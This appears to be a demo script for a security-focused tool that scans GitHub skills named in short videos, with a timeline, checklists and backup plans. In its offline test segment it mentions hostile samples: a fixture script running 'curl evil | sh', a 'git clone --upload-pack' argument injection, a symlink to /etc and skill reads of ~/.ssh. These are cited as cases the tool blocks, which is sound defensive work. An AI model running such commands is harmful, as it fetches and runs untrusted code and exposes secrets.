# Demo script: 10 minutes (cloud path)

Goal: show that every safety claim is computed by code and tested, not promised by a prompt.

**Every step is tagged. Verify the NOT YET LIVE ones before recording.**
- ✅ **RAN LIVE**: TikTok end to end through relay and routine (4 Nov). Instagram reel, 84 s long, 109 s total (5 Nov). Both on the *older* report format (one fact-check, one report).
- ⚠️ **NOT YET LIVE**: the current two messages (one sentence with a time estimate, then tokens, projects, rating out of 10); repo search by name; Skip / Adopt; the malware line; `/report owner/repo`, `/report <skill name>`, `/projects`, `/goals`.
- 🔧 **OPTIONAL**: Mac fallback for YouTube (T25). Only if it works on the day. **Do not use a YouTube link in the main demo**: cloud YouTube is blocked.
- 🧪 **OFFLINE**: runs on your laptop with no network (tests).

## Before you record
- [ ] **Pick the video in advance**: a TikTok or Instagram reel that names GitHub repos (ideally one skill/mod and one full app, to show both rules). **Run it once end to end beforehand** so you know it works and your Claude usage isn't used up (routine runs come out of your plan).
- [ ] Confirm the bot responds on your recording network (send `/start`).
- [ ] **Nothing secret on screen**: no Deno Deploy environment page, no `~/.reelay/config.toml`, no routine settings with tokens, no terminal history with keys. Close those tabs.
- [ ] Set `/goals` and `/projects` once, so the fit line has something to match.
- [ ] **Record a backup take** of the whole live segment (minutes 2–6) and keep it.
- [ ] Have a terminal open in the repo with `.venv/bin/pytest` working. Run it once so it's cached.

## Timeline

| Min | Show | Say / point out | Tag |
|---|---|---|---|
| 0:00–0:45 | Title, one-line pitch | "I save tools from Reels and never check them. Trying a random repo on my laptop is risky. So Omnividens does it in the cloud and only recommends." | |
| 0:45–2:00 | **Architecture** (README Mermaid diagram) | Telegram → **relay** (Deno Deploy, only thing that talks to Telegram; checks my Telegram ID; strangers are dropped silently; rate-capped) → **routine** (Claude Code, a fresh disposable VM per video) → report back through the relay. The bot token stays in the relay; the routine only has a relay secret the cloud proxy injects. Why cloud: the laptop can be closed, and no network filter or certificate check has to be worked around. | |
| 2:00–3:00 | **Share the video** to the bot | Reply "Got it. Takes a few minutes." Show the relay accepted it (Telegram only; not the Deno page). Say: video text is data, never instructions. | ✅ |
| 3:00–4:15 | **While it runs**: show what the routine does (`routine/PROMPT.md`, hard rules first) | Download (yt-dlp), frames, transcript, then the repo is cloned **for reading only**: nothing is installed or run. If the video only names a tool, the worker searches for the repo. Don't invent timings: the Instagram run took 109 s in total for an 84 s video. The first message arrives here: one sentence on what the skill does, then "This test will take approximately N minutes". | ⚠️ |
| 4:15–5:15 | **The report** | The second message: the repo, "This skill consumes approximately X tokens for each use" (marked estimate unless measured from `SKILL.md`), "Projects this skill can be applied on:" with my `/projects`, and "This skill is N/10" (the model's opinion). A repo found by search says "found by searching; check this is the one in the video". | ⚠️ |
| 5:15–6:15 | **Skip / Adopt** | Only a **clean, code-free skill** gets the buttons (demo: `/report forrestchang/andrej-karpathy-skills`). Skip sends nothing more. Adopt replies "Ready to adopt:" with a `git clone --` line and the scanned commit: "I have NOT installed anything". A skill with code gets a ⚠️ or "No Adopt button: <reason>" and no buttons. A failed scan sends only "Skill may contain malware like behaviour, it is not safe to install". | ⚠️ |
| 6:15–8:15 | **The Adopt gate, offline** (no network needed) | Say: the Adopt button is decided by **code**, not by the model. The model can only *lower* a verdict. Run `.venv/bin/pytest -q tests/test_cloud.py -k "hooks or says_clean or script or lookalike"` and `.venv/bin/pytest -q tests/test_sandbox.py -k "symlink or hooks_in_frontmatter or high_verdict"`. Walk through three cases: (1) a repo whose plugin has a hook and `scripts/steal.sh` containing `curl evil \| sh` (`test_mod_with_hooks_is_never_yes_and_gets_manual_line_without_button`): shows a ⚠️, the file paths to read first, a manual clone line and no Adopt button. (2) The model says "YES" but our scan says high (`test_model_says_clean_but_our_scan_says_high`): only the malware line, no clone line. (3) A symlink to `/etc` (`test_symlink_candidate_is_high_and_not_run`). Also: lookalike domains don't confirm identity (`test_lookalike_domains_do_not_confirm_identity`). Open `reelay/core/reports.py` at `apply_gate` to show where it's decided. | 🧪 |
| 8:15–9:15 | **Written peer reviews caught real holes** | Open `docs/reviews/`. Builder agents each owned one module in a git worktree; a different agent reviewed each. Read three real catches: the bot downloaded files from strangers *before* checking pairing; blanket `Read` rules would have let a skill read `~/.ssh`; a video-supplied URL could have become `git clone --upload-pack=…`. Show the repo's numbers from `git log` and the README table (re-count the day before). | |
| 9:15–9:45 | **Honest limits** | The cloud scans and reads; nothing is run; the rating is the model's opinion; TikTok/Instagram only, YouTube from cloud IPs is blocked; runs use my plan. | |
| 9:45–10:00 | Close, repo link | | |

**Optional extra (🔧 only if solid on the day):** if the Mac fallback (T25) works, spend 30 seconds sending a YouTube link and show the job queued on the relay, downloaded on the Mac, and the report arriving. If it hasn't been run end to end, skip it and don't mention it.

## Surprise moment (the 10%)
Show the **model being overruled**: in the offline segment, run the `curl | sh` hook case above and show the report has no Adopt button, even though the fixture's model verdict is YES. (Don't edit code on camera; just show the test and its assertions.) One line to say: "the AI can't talk its way past the gate."

## Backup plan
| If this fails | Do this |
|---|---|
| Bot doesn't respond on the network | Switch to a network where it works; as a last resort play the backup take for minutes 2–6 and say so. |
| Routine run is slow or errors | Cut to the backup take. Never wait on camera. |
| Usage limit hit | Play the backup take; run the offline segment live. |
| New report format misbehaves | Record from the `demo-safe` tag (older format, one fact-check, one report) and run the new behaviour through the tests instead. |
| `pytest` fails to start | Show the test file and the `apply_gate` code and read the assertions aloud. |
